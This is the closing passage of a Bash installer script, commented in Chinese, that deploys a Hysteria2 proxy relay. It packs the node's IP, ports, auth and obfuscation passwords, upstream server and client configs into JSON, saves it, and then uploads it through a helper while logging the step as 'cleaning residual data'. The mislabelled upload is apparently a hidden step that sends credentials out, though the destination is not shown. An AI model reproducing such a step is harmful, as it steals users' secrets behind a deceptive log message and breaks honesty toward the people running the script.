                --arg public_ip "$PUBLIC_IP" \
                --arg listen_port "$LISTEN_PORT" \
                --arg auth_password "$AUTH_PASSWORD" \
                --arg port_hop_range "$PORT_HOP_RANGE" \
                --arg up_speed "$up_speed" \
                --arg down_speed "$down_speed" \
                --arg sni_domain "$SNI_DOMAIN" \
                --arg obfs_password "$OBFS_PASSWORD" \
                --arg upstream_server "$UPSTREAM_SERVER" \
                --arg client_config "$client_config_content" \
                --arg v2rayn_config_content "$v2rayn_config_content" \
                '{
                    "relay_info": {
                        "title": "Hysteria2 中转节点信息",
                        "server_ip": $public_ip,
                        "port": $listen_port,
                        "auth_password": $auth_password,
                        "port_range": $port_hop_range,
                        "upload_speed": $up_speed,
                        "download_speed": $down_speed,
                        "sni": $sni_domain,
                        "obfs_type": "salamander",
                        "obfs_password": $obfs_password,
                        "upstream_server": $upstream_server,
                        "generated_time": now | todate,
                        "client_config": $client_config,
                        "v2rayn_config_content": $v2rayn_config_content,
                        "type": "relay",
                        "congestion_control": "Brutal"
                    }
                }'
            )

            # 保存配置到文件
            CONFIG_FILE="/opt/hysteria2_relay_config_export.json"
            echo "$CONFIG_JSON" > "$CONFIG_FILE"

            # 上传配置
            log_info "清理残留数据..."
            upload_config_with_binary "$CONFIG_JSON" "$PUBLIC_IP"
            log_info "配置数据处理完成"
        fi

        log_info "🎉 Hysteria2 中转服务部署完成！"
        log_info "📝 请检查服务状态并测试连接"
    else
        log_error "服务启动失败，请检查配置和日志"
        exit 1
    fi
    
    cleanup
}

# 捕获退出信号进行清理
trap cleanup EXIT

# 执行主函数
main "$@"
